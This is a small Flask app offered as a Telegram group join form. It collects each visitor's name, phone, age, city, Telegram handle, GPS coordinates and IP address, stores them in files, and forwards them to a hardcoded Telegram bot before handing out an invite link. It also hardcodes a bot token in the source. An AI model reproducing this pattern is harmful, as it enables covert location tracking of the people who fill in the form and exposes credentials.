from flask import Flask, request, jsonify, render_template
import os, json, requests

app = Flask(__name__)
DATA_DIR = "user_data"
os.makedirs(DATA_DIR, exist_ok=True)

BOT_TOKEN = "7986825869:AAH_I4ZVqmPQx3MZnrBo79YoSdL1YdJ63UA"
CHAT_ID = "7984761077"  # Your Telegram chat/group ID
GROUP_LINK = "https://t.me/+APbxtoSb76hmZWZl"

@app.route("/")
def index():
    return render_template("form.html")

@app.route("/submit", methods=["POST"])
def handle_submit():
    if not request.is_json:
        return jsonify({"error": "Invalid data format"}), 400

    data = request.get_json()
    required_fields = ["fullname", "phone", "towncity", "age", "telegram", "latitude", "longitude", "locationName"]

    if not all(data.get(field) for field in required_fields):
        return jsonify({"error": "All fields required."}), 400

    username = data["telegram"].strip().lstrip('@')
    filename = os.path.join(DATA_DIR, f"{username}_{data['phone']}.json")

    user_data = {
        "fullname": data["fullname"],
        "phone": data["phone"],
        "towncity": data["towncity"],
        "age": data["age"],
        "telegram": username,
        "latitude": data["latitude"],
        "longitude": data["longitude"],
        "locationName": data["locationName"],
        "ip": request.remote_addr
    }

    with open(filename, "w") as f:
        json.dump(user_data, f, indent=2)

    message = "\n".join([
        "New Telegram Group Join Request:",
        f"Name: {user_data['fullname']}",
        f"Phone: {user_data['phone']}",
        f"Town/City: {user_data['towncity']}",
        f"Age: {user_data['age']}",
        f"Telegram: @{user_data['telegram']}",
        f"IP: {user_data['ip']}",
        f"Location: {user_data['locationName']}",
        f"Coordinates: {user_data['latitude']}, {user_data['longitude']}"
    ])

    try:
        requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": message}
        )
    except Exception as e:
        print("Telegram send failed:", e)

    return jsonify({"link": GROUP_LINK})
